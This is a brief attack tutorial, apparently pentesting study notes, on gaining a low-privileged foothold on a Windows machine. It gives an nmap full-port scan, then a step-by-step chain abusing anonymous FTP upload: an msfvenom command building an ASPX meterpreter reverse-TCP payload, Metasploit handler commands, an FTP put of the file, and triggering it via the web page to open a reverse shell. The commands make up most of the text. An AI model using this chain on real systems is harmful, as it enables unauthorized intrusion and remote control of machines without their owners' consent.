# Gaining a Foothold

Gaining a foothold is the attacker way to get a low privileged user in a windows machine 

In the first stage we are scanning all the ports in the network of the host using the scanners like nmap

```
nmap -A -T4 -p- ip_address
```

There could be a possibility of the ftp port be open (via 21) and allow anonymous login (which can be logged in without any password). File Transfer Protocol is used to upload and download the files in the server

There could be a possibility of upload a file in a ftp login and can be viewed in the webpage which could also make the possibility of the reverse shell. Upload the reverse shell script according to the tech stack (php, asp, etc). For example the host is used to have asp executable

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip_address LPORT=4444 -f aspx > exploit.aspx

// run metasploit simulanously 
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
run 

// now upload in the ftp login
put exploit.aspx

// viewing in the webpage leads to the reverse shell and now we got the initial low privileged user 
```

We can also manually also exploit it, there are many github repository with the payloads. Here it is one of the foothold to gain low privileged access using ftp anonymous login. There could be many vulnerability exist to do it. The next step after gain low privileged access is to start escalate to higher privilege.


